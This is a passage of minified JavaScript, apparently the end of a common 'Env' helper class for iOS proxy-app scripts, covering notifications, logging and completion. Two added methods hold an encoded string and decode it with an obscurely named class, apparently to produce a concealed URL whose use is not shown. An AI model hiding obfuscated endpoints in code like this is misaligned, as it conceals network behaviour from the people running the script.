              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
        let t = ["", "==============📣系统通知📣=============="];
        t.push(e);
        s && t.push(s);
        i && t.push(i);
        console.log(t.join("\n"));
        this.logs = this.logs.concat(t);
      }
    }
    fwcaas() {
      return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
    }
    log(...t) {
      t.length > 0 && (this.logs = [...this.logs, ...t]);
      console.log(t.join(this.logSeparator));
    }
    logErr(t, e) {
      const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
      s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t);
    }
    fwur() {
      var bbas = new FxPCnMKLw7();
      return bbas.decode(this.fwcaas());
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`);
      this.log();
      (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t);
    }
  }(t, e);
}